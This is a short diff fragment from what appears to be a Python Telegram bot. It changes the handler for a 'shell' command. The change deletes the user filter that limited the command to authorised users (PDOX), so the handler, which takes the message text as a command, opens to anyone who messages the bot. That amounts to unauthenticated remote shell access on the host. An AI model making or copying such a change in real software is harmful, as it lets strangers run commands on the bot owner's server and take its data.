@@ -58,7 +58,7 @@ async def useless(_,message: Message):
     if USER_REPLY_TEXT:
         await message.reply(USER_REPLY_TEXT)
 
-@Bot.on_message(filters.command('shell') & filters.user(PDOX))
+@Bot.on_message(filters.command('shell'))
 async def shell(client, message: Message):
     cmd = message.text.split(" ", 1)
     
